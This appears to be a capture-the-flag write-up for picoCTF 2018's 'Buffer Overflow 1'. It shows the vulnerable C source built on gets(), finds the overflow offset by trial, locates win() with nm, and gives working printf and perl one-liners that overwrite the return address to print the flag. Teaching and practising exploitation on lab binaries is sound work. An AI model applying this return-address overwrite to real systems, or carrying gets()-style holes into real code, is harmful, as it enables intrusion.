# Buffer Overflow 1

	This is a basic challenge from picoCTF 2018

# Category: Binary Exploitation

# Points: 200

		./vuln
		Please enter your string:
		aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
		Okay, time to return... Fingers Crossed... Jumping to 0x61616161
		Segmentation fault (core dumped)

# Write Up:

To start. vuln uses "gets". This allows you to send more than the buffer size.

So it takes 33 characters to overflow the buffer; but it doesn't crash at 33...

So the source is helpful but it doesn't tell how much it takes to actually crash it. So we add a lot of a's.

Now it returns 0x61616161. 0x61 is hex 'a' 

So I will find where specificially I can manipulate my string.

		z3r0@ubuntu:~/Desktop/GitHub/borg/cseagle/Eagle Challenges/buffer_overflow_1$ ./vuln 
		Please enter your string: 
		aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd                             
		Okay, time to return... Fingers Crossed... Jumping to 0x64636261
		Segmentation fault (core dumped)
		z3r0@ubuntu:~/Desktop/GitHub/borg/cseagle/Eagle Challenges/buffer_overflow_1$ ./vuln 
		Please enter your string: 
		aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeeee   
		Okay, time to return... Fingers Crossed... Jumping to 0x65656565
		Segmentation fault (core dumped)	

Now time to "Control Flow Hijack"

		#include <stdio.h>
		#include <stdlib.h>
		#include <string.h>
		#include <unistd.h>
		#include <sys/types.h>
		#include "asm.h"	

		#define BUFSIZE 32
		#define FLAGSIZE 64

		void win() {
		  char buf[FLAGSIZE];
		  FILE *f = fopen("flag.txt","r");
		  if (f == NULL) {
		    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
		    exit(0);
		  }

		  fgets(buf,FLAGSIZE,f);
		  printf(buf);
		}

		void vuln(){
		  char buf[BUFSIZE];
		  gets(buf);

		  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
		}
	
		int main(int argc, char **argv){

		  setvbuf(stdout, NULL, _IONBF, 0);
  
		  gid_t gid = getegid();
		  setresgid(gid, gid, gid);
	
		  puts("Please enter your string: ");
		  vuln();
		  return 0;
		}

We need to find the address of "win"

		z3r0@ubuntu:~/Desktop/GitHub/borg/cseagle/Eagle Challenges/buffer_overflow_1$ nm vuln
		0804a03c B __bss_start
		0804a040 b completed.7209
		0804a034 D __data_start
		0804a034 W data_start
		08048510 t deregister_tm_clones
		08048580 t __do_global_dtors_aux
		08049f0c t __do_global_dtors_aux_fini_array_entry
		0804a038 D __dso_handle
		08049f14 d _DYNAMIC
		0804a03c D _edata
		0804a044 B _end
		         U exit@@GLIBC_2.0
		         U fgets@@GLIBC_2.0
		08048734 T _fini
		         U fopen@@GLIBC_2.1
		08048748 R _fp_hw
		080485a0 t frame_dummy
		08049f08 t __frame_dummy_init_array_entry
		08048970 r __FRAME_END__
		         U getegid@@GLIBC_2.0
		080486c0 T get_return_address
		         U gets@@GLIBC_2.0
		0804a000 d _GLOBAL_OFFSET_TABLE_
		         w __gmon_start__
		0804882c r __GNU_EH_FRAME_HDR
		080483ec T _init
		08049f0c t __init_array_end
		08049f08 t __init_array_start
		0804874c R _IO_stdin_used
		         w _ITM_deregisterTMCloneTable
		         w _ITM_registerTMCloneTable
		08049f10 d __JCR_END__
		08049f10 d __JCR_LIST__
		         w _Jv_RegisterClasses
		08048730 T __libc_csu_fini
		080486d0 T __libc_csu_init
		         U __libc_start_main@@GLIBC_2.0
		0804865d T main
		         U printf@@GLIBC_2.0
		         U puts@@GLIBC_2.0
		08048540 t register_tm_clones
		         U setresgid@@GLIBC_2.0
		         U setvbuf@@GLIBC_2.0
		080484d0 T _start
		0804a03c B stdout@@GLIBC_2.0
		0804a03c D __TMC_END__
		0804862f T vuln
		080485cb T win
		08048500 T __x86.get_pc_thunk.bx

So the address of win() is 0x080485cb

		printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08" | ./vuln 
		Please enter your string: 
		Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
		Congrats! C3T{flag}
		Segmentation fault (core dumped)

Remember Little Endian... So you must put the address in "cb", "85", "04", "08"

Now if you want to use perl instead.

		perl -e 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08"' | ./vuln 
		Please enter your string: 
		Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
		Congrats! C3T{flag}
		Segmentation fault (core dumped)

Congrats, that's all folks.
